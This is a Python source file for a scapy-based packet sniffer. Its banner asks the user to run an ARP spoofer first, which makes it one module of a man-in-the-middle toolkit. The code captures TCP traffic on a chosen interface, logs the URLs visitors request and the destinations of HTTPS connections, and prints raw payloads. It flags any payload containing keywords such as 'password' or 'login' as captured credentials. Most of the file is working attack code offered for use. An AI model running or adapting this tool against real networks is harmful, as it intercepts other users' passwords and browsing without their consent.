import time
from colorama import Fore
from colorama import Style
import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re
import requests


choice = "Y"


def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ipconfig", "/all"], shell=True)
        output = output.decode("utf-8")
        mac_search = re.search(r"({}[\s\S]*?Physical Address[\s\S]*?[\r\n].*?[\r\n])".format(interface), output, re.IGNORECASE)
        if mac_search:
            mac_address = re.search(r"(([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2}))", mac_search.group(1)).group(1)
            return mac_address
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Error: {e}")
    return None


def get_current_ip(interface):
    try:
        output = subprocess.check_output(["ipconfig", "/all"], shell=True)
        output = output.decode("utf-8")
        ip_search = re.search(r"({}[\s\S]*?IPv4 Address[\s\S]*?[\r\n].*?[\r\n])".format(interface), output, re.IGNORECASE)
        if ip_search:
            ip_address = re.search(r"(\d+\.\d+\.\d+\.\d+)", ip_search.group(1)).group(1)
            return ip_address
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Error: {e}")
    return None


def ip_table():
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}Interface', 'Mac Address', f'IP Address{Style.RESET_ALL}'])
    for k, v in addrs.items():
        mac = get_current_mac(k)
        ip = get_current_ip(k)
        if ip and mac:
            t.add_row([k, mac, ip])
        elif mac:
            t.add_row([k, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    print(t)


def sniff(interface):
    print(f"{Fore.BLUE}[*] Capturing all TCP traffic (HTTP + HTTPS + raw data){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop sniffing{Style.RESET_ALL}\n")
    # Capture both port 80 (HTTP) and port 443 (HTTPS) and all TCP
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp")


def process_sniffed_packet(packet):
    # ---- HTTP Traffic (port 80) ----
    if packet.haslayer(http.HTTPRequest):
        url_extractor(packet)
        login_info = get_login_info(packet)
        if login_info:
            print(f"{Fore.GREEN}[+] Possible credentials found: {login_info}{Style.RESET_ALL}")

        # Show HTTP headers
        try:
            http_layer = packet[http.HTTPRequest]
            method = http_layer.Method.decode() if http_layer.Method else "?"
            host = http_layer.Host.decode() if http_layer.Host else "?"
            path = http_layer.Path.decode() if http_layer.Path else "/"
            print(f"{Fore.CYAN}[HTTP] {method} http://{host}{path}{Style.RESET_ALL}")
        except Exception:
            pass

    # ---- HTTPS Traffic (port 443) - can't decrypt but log the destination ----
    elif packet.haslayer(scapy.all.IP) and packet.haslayer(scapy.all.TCP):
        tcp_layer = packet[scapy.all.TCP]
        ip_layer = packet[scapy.all.IP]

        if tcp_layer.dport == 443:
            print(f"{Fore.MAGENTA}[HTTPS] {ip_layer.src} --> {ip_layer.dst}:443 (encrypted){Style.RESET_ALL}")

        # ---- Raw TCP data on other ports ----
        elif packet.haslayer(scapy.all.Raw):
            try:
                raw_data = packet[scapy.all.Raw].load.decode("utf-8", errors="ignore")
                if raw_data.strip():  # Only print if there's actual data
                    print(f"{Fore.WHITE}[RAW TCP] {ip_layer.src}:{tcp_layer.sport} --> {ip_layer.dst}:{tcp_layer.dport}{Style.RESET_ALL}")
                    print(f"  Data: {raw_data[:200]}")  # Print first 200 chars only

                    # Check for credentials in raw data too
                    keywords = ["username", "user", "email", "pass", "login", "password"]
                    for keyword in keywords:
                        if keyword.lower() in raw_data.lower():
                            print(f"{Fore.RED}[!!!] POSSIBLE CREDENTIALS IN RAW DATA: {raw_data[:300]}{Style.RESET_ALL}")
                            break
            except Exception:
                pass


def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        try:
            load = packet[scapy.all.Raw].load
            load_decode = load.decode("utf-8", errors="ignore")
            keywords = ["username", "user", "email", "pass", "login", "password", "UserName", "Password"]
            for keyword in keywords:
                if keyword in load_decode:
                    return load_decode
        except UnicodeDecodeError:
            pass


def url_extractor(packet):
    ip_layer = packet.getlayer('IP')
    if ip_layer:
        http_layer = packet.getlayer('HTTPRequest')
        if http_layer:
            try:
                print(f"{Fore.YELLOW}[URL] {ip_layer.fields['src']} requested "
                      f"{http_layer.fields['Method'].decode()} "
                      f"{http_layer.fields['Host'].decode()}"
                      f"{http_layer.fields['Path'].decode()}{Style.RESET_ALL}")
            except Exception:
                pass


def main_sniff():
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start ARP Spoofer Before Using this Module [***]{Style.RESET_ALL}")
    try:
        ip_table()
        interface = input("[*] Please enter the interface name: ")
        print(f"{Fore.BLUE}[*] Sniffing Packets on {interface}...{Style.RESET_ALL}")
        sniff(interface)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Stopping sniffer...{Style.RESET_ALL}")
        time.sleep(1)


main_sniff()